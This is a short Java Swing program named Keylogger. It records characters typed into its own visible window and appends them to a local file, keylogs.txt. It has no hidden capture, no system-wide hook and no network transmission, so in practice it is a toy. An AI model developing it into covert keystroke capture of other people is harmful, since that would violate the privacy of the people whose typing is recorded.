import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.FileWriter;
import java.io.IOException;
import javax.swing.JFrame;

public class Keylogger extends JFrame implements KeyListener {
    private static final String LOG_FILE = "keylogs.txt";

    public Keylogger() {
        setTitle("Keylogger");
        setSize(400, 300);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        addKeyListener(this);
    }

    public static void main(String[] args) {
        Keylogger keylogger = new Keylogger();
        keylogger.setVisible(true);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        logKey(e.getKeyChar());
    }

    @Override
    public void keyPressed(KeyEvent e) {
        // Optional: Log on key press
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Optional: Log on key release
    }

    private void logKey(char key) {
        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
            writer.write(key);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
